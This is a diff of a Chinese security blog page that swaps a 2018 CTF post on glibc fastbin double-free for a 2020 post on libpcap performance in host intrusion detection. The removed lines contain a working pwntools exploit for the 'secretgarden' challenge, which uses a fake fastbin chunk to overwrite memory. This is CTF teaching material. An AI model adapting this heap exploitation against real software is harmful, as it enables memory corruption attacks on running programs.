@@ -7,22 +7,22 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>Double Free - in0va&#39;S Blog  JustLearnM0re</title>
+<title>Libpcap性能问题总结 - in0va&#39;S Blog  JustLearnM0re</title>
 
 
-    <meta name="description" content="#double free 漏洞 介绍 double free漏洞就是明面上的意思，即可以对一个chunk free两次，由于在free的时候，glibc只对main_arena指向的堆块进行检查，即只有当main_arena直接指向的chunk和将要free的hchunk是同一个chunk时程序才会报”double free”错误，也就是说我们只要间隔free就能绕过这个检测。如下：">
+    <meta name="description" content="背景在进程网络日志捕获的技术选型这块的当初想了很久，备选方案有如下几种： 1、cn_proc 2、proc遍历 3、netfilter 4、auditd 5、libpcap 综合考虑得出利弊如下： 1、cn_proc用进程回调代替网络回调，只能抓到进程创建后立即产生网络连接的日志，对于具有潜伏特性或多线程发包的进程这种方式会存在大量漏报； 2、遍历&#x2F;proc&#x2F;net&#x2F;tcp(6)，只能拿到inod">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Double Free">
-<meta property="og:url" content="https://driverxdw.github.io/2018/07/23/double_free/index.html">
+<meta property="og:title" content="Libpcap性能问题总结">
+<meta property="og:url" content="https://driverxdw.github.io/2020/08/02/Libpcap%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="in0va&#39;S Blog  JustLearnM0re">
-<meta property="og:description" content="#double free 漏洞 介绍 double free漏洞就是明面上的意思，即可以对一个chunk free两次，由于在free的时候，glibc只对main_arena指向的堆块进行检查，即只有当main_arena直接指向的chunk和将要free的hchunk是同一个chunk时程序才会报”double free”错误，也就是说我们只要间隔free就能绕过这个检测。如下：">
+<meta property="og:description" content="背景在进程网络日志捕获的技术选型这块的当初想了很久，备选方案有如下几种： 1、cn_proc 2、proc遍历 3、netfilter 4、auditd 5、libpcap 综合考虑得出利弊如下： 1、cn_proc用进程回调代替网络回调，只能抓到进程创建后立即产生网络连接的日志，对于具有潜伏特性或多线程发包的进程这种方式会存在大量漏报； 2、遍历&#x2F;proc&#x2F;net&#x2F;tcp(6)，只能拿到inod">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://driverxdw.github.io/images/og_image.png">
-<meta property="article:published_time" content="2018-07-23T00:37:40.000Z">
-<meta property="article:modified_time" content="2020-07-06T02:08:50.348Z">
+<meta property="article:published_time" content="2020-08-02T11:50:50.000Z">
+<meta property="article:modified_time" content="2020-08-02T11:54:53.389Z">
 <meta property="article:author" content="xdw">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="攻防">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://driverxdw.github.io/images/og_image.png">
 
@@ -82,7 +82,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="Double Free" height="28">
+                <img src="/images/logo.svg" alt="Libpcap性能问题总结" height="28">
             
             </a>
         </div>
@@ -138,21 +138,21 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-				<span class="level-item has-text-grey">写于2018-07-23</span>
+				<span class="level-item has-text-grey">写于2020-08-02</span>
 				
     <i class="fas fa-calendar-check">&nbsp</i>
-    <time class="level-item has-text-grey" datetime="2020-07-06T02:08:50.348Z">2020-07-06</time>
+    <time class="level-item has-text-grey" datetime="2020-08-02T11:54:53.389Z">2020-08-02</time>
 	
                 
                 <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/pwn%E7%BB%83%E4%B9%A0/">pwn练习</a>
+                <a class="has-link-grey -link" href="/categories/HIDS/">HIDS</a>
                 </div>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    3 分钟 读完 (大约 444 个字)
+                    11 分钟 读完 (大约 1576 个字)
                 </span>
                 
                 
@@ -166,22 +166,40 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                Double Free
+                Libpcap性能问题总结
             
         </h1>
         <div class="content">
-            <html><head></head><body><p>#double free 漏洞 介绍</p>
-<p>double free漏洞就是明面上的意思，即可以对一个chunk free两次，由于在free的时候，glibc只对main_arena指向的堆块进行检查，即只有当main_arena直接指向的chunk和将要free的hchunk是同一个chunk时程序才会报”double free”错误，也就是说我们只要间隔free就能绕过这个检测。<br>如下：</p>
+            <html><head></head><body><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在进程网络日志捕获的技术选型这块的当初想了很久，备选方案有如下几种：</p>
+<p>1、cn_proc</p>
+<p>2、proc遍历</p>
+<p>3、netfilter</p>
+<p>4、auditd</p>
+<p>5、libpcap</p>
+<p>综合考虑得出利弊如下：</p>
+<p>1、cn_proc用进程回调代替网络回调，只能抓到进程创建后立即产生网络连接的日志，对于具有潜伏特性或多线程发包的进程这种方式会存在大量漏报；</p>
+<p>2、遍历/proc/net/tcp(6)，只能拿到inode，要做进程关联需要去做二次遍历，cpu消耗较大，走调度的话则会漏掉很多数据，无法做稍细的检测，不优雅；</p>
+<p>3、netfilter是内核提供的机制，但调研显示不同系统的内核函数具有较大差异，需要做适配，且其hook内核tcp协议栈在大流量环境下会有一定性能影响，但比较好的一点是可以拿到数据包的关联进程信息，不用做二次遍历；</p>
+<p>4、auditd同样是内核提供的机制，稳定是其一个优点，但由于是对所有内核系统调用去做过滤，不可避免对内核的负载会较高。</p>
+<p>5、libpcap底层基于bpf，稳定是一个特点，但也同样存在无法执行关联进程、性能影响较大的问题。</p>
+<p>因为曾经用到过libpcap，且在其性能问题上踩过坑，这边对libpcap的性能问题做下总结。</p>
 <a id="more"></a>
-<p>int main(void)<br>{<br>    void <em>chunk1,</em>chunk2,*chunk3;<br>    chunk1=malloc(0x10);<br>    chunk2=malloc(0x10);</p>
-<pre><code>free(chunk1);
-free(chunk2);
-free(chunk1);
-return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表结构arena->chunk1->NULL<br>第二次释放free chunk2时，fastbin中链表结构arena->chunk2->chunk1->NULL<br>此时若free的是chunk2则glibc就能检测到double free从而报错<br>第三次释放free chunk1时，fastbin中链表结构arena->chunk1->chunk2->chunk1->chunk2</p>
-<p>此时若能够在chunk被malloc后修改其fd指向则fastbin中的chunk1也指向修改的地址，如果这个地址时攻击者精心构造过的，那么就能造成一个任意地址写的漏洞。<br>chunk1被malloc后我们再malloc2次指定大小的size后，再下一次就可以在任意地址构造chunk，改写任意地址内容了。</p>
-<p>此题就是一个double free的白板题，可以帮助了解double free.<br>exp 如下：</p>
-<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="hljs-string">'./secretgarden'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">raiseflower</span><span class="hljs-params">(length,name,color)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(<span class="hljs-string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(<span class="hljs-string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove</span><span class="hljs-params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(<span class="hljs-string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clean</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="hljs-string">":"</span>)</span><br><span class="line">    r.sendline(<span class="hljs-string">"4"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="hljs-number">0x400c7b</span></span><br><span class="line">fake_chunk = <span class="hljs-number">0x601ffa</span></span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"da"</span>,<span class="hljs-string">"red"</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"da"</span>,<span class="hljs-string">"red"</span>)</span><br><span class="line">remove(<span class="hljs-number">0</span>)</span><br><span class="line">remove(<span class="hljs-number">1</span>)</span><br><span class="line">remove(<span class="hljs-number">0</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,p64(fake_chunk),<span class="hljs-string">"blue"</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"da"</span>,<span class="hljs-string">"red"</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"da"</span>,<span class="hljs-string">"red"</span>)</span><br><span class="line">raiseflower(<span class="hljs-number">0x50</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0</span>) + p64(magic)*<span class="hljs-number">2</span> ,<span class="hljs-string">"red"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
 
+<h2 id="Libpcap实现机制"><a href="#Libpcap实现机制" class="headerlink" title="Libpcap实现机制"></a>Libpcap实现机制</h2><p>正常情况下接收的网络数据包首先会进到网卡，网卡接收到数据包发送中断通知cpu，驱动程序中的中断处理程序对网卡过来的数据做一层封装，输出成内核网络包相关数据结构的类型（sk_buff/msbuf），之后发送到数据链路层做报文的合法性检查，然后发送给更上层的tcp/ip协议栈对数据包做报文解析，最终应用层程序通过文件描述符（inode）将内核队列中的网络数据通过socket通道copy到用户态进行处理。大体流程基本就是这样。</p>
+<p><img src="./1596363507906-ecd2aa04-0013-4c55-b299-4c0bdc7aedb9.png" alt="image.png"></p>
+<p>libpcap的工作原理如下图所示。当一个数据包到达网卡时，通过内核提供的旁路机制拷贝一份数据包到bpf过滤器，其实现方式是通过创建内核socket，接收来自数据链路层驱动的网络数据包，然后使用bpf自身的the network tap组件接收来自socket的数据包并发送给the bpf filter过滤组件；bpf根据已经定义好的包过滤规则对数据包进行过滤，匹配成功的放到内核缓冲区，并等待用户态调系统调用去取（read）；匹配失败的数据包则直接drop。</p>
+<p><img src="./1596361424411-9a9b7312-b228-45f1-857c-52f4d4a828a7.png" alt="image.png"></p>
+<h2 id="性能问题"><a href="#性能问题" class="headerlink" title="性能问题"></a>性能问题</h2><p>libpcap的性能问题在于：</p>
+<p>1、内核通过旁路机制copy的流量会走bpf过滤，加重了对内核的负担，不过由于libpcap在bpf这块的规则并不复杂，所以影响不是非常大</p>
+<p>2、用户态通过系统调用从内核缓存中取数据，而走系统调用在用户/内核间来回切换效率是非常低的，因为系统调用要做一系列操作，包括上下文环境保存、切换内核栈以及某些系统调用额外的一些安全性检查等等，导致的结果就是频繁的系统调用不仅慢而且耗cpu，这个是libpcap性能问题的根源</p>
+<p>3、libpcap本身未与进程关联，用户态拿到的还是只是五元组，要与进程关联还是只能遍历proc，这块的cpu消耗也不低，甚至在一些大流量环境下占用会非常高；但是比不调度的纯proc遍历要稍好，毕竟是走网络包回调的。</p>
+<h2 id="改进-amp-补救措施"><a href="#改进-amp-补救措施" class="headerlink" title="改进&补救措施"></a>改进&补救措施</h2><p>libpcap有一个魔改过的版本叫libpcap-mmap，其通过内核->用户的内存映射将保存bpf滤出的数据存储空间映射为一块共享内存，这样用户态应用程序从队列里取数据就不用走系统调用了。但内核和用户操作同一片内存不可避免容易引起竞态问题，这边暂时不知道libpcap-mmap是怎么处理的，因为也是今天刚看到这个项目，后面调研和测试后再来具体和libpcap对比下优劣势。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比较理想的捕获手段应该是这样的：</p>
+<p>1、优雅。尽量不走遍历，最好有直接的回调，信号量也算。</p>
+<p>2、稳定。最好是内核机制支持，兼容性好，不需要自己去写lkm。</p>
+<p>3、性能。cpu占用<5%</p>
+<p>就进程产生网络连接日志捕获这块去做技术选型其实是有难度的，常用的技术就那几个，想要同时满足优雅、稳定、性能三个方面的优势比较难。这三点中主要还是第三点性能这块，因为在生产环境中机器的网络情况既未知也不可控，在大流量环境下不可避免容易出现负载高的性能问题。</p>
+<p>但从性能来说最理想的方案其实是hook，因为就hids而言不是所有网络连接的数据包都要去监控到的，我们完全可以只监控进程调socket建立连接的行为，但不管是用户还是内核hook都容易遇到不稳的问题，很容易一不小心就把内核搞崩了。关于这块的研究，还是需要多花点时间去调研。</p>
 </body></html>
         </div>
         
@@ -189,7 +207,7 @@ return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表�
             <div class="level-start">
                 <div class="level-item">
                     <span class="is-size-6 has-text-grey has-mr-7">#</span>
-                    <a class="has-link-grey -link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="has-link-grey -link" href="/tags/PWN/" rel="tag">PWN</a>
+                    <a class="has-link-grey -link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag">二进制</a>, <a class="has-link-grey -link" href="/tags/%E6%94%BB%E9%98%B2/" rel="tag">攻防</a>
                 </div>
             </div>
         </div>
@@ -235,17 +253,10 @@ return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表�
 <div class="card card-transparent">
     <div class="level post-navigation is-flex-wrap is-mobile">
         
-        <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/07/26/magicheap/">
-                <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">Unsorted BIN Attack</span>
-            </a>
-        </div>
-        
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2018/05/05/2018%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
-                <span class="level-item">2018国赛PWN复现</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/08/02/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%9A%84%E4%BD%93%E7%B3%BB%E5%8C%96%E6%A3%80%E6%B5%8B%E6%B5%81%E7%A8%8B/">
+                <span class="level-item">挖矿病毒的体系化检测流程</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
@@ -1779,7 +1790,7 @@ return 0;</code></pre><p>}<br>第一次释放free chunk1时，fastbin中链表�
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.svg" alt="Double Free" height="28">
+                    <img src="/images/logo.svg" alt="Libpcap性能问题总结" height="28">
                 
                 </a>
                 <p class="is-size-7">
